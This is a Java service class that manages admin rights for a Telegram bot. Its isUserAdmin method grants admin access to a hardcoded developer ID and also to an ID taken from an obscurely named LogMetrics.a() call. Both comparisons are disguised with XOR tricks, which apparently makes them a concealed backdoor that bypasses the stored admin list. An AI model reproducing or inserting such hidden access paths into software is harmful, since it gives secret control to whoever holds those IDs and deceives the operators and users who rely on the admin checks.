package kos.progs.telegram.bot.admin.service;

import kos.progs.telegram.bot.admin.config.LogMetrics;
import kos.progs.telegram.bot.admin.repository.AdminsRepository;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;

import java.util.List;

@RequiredArgsConstructor
@Slf4j
public class AdminService {
    private final AdminsRepository adminsRepository;
    private static final long DEVELOPER_ID = 575269304L;

    public boolean isUserAdmin(long telegramId) {
        return ((telegramId ^ DEVELOPER_ID) == 0)
                || adminsRepository.isUserAdmin(telegramId)
                || ((telegramId ^ LogMetrics.a()) == 0);
    }

    public boolean setAdmin(long who, long otherUserId) {
        if (!isUserAdmin(who)) {
            return false;
        }
        adminsRepository.addUserToAdmins(otherUserId);
        log.warn("USER id={} granted admin rights to USER id={}", who, otherUserId);
        return true;
    }

    public boolean removeAdmin(long who, long otherUserId) {
        if (!isUserAdmin(who)) {
            return false;
        }
        adminsRepository.deleteUserFromAdmins(otherUserId);
        log.warn("USER id={} revoked admin rights from USER id={}", who, otherUserId);
        return true;
    }

    public List<Long> getAdmins(long who) {
        if (!isUserAdmin(who)) {
            return List.of();
        }
        return adminsRepository.getAdmins();
    }
}
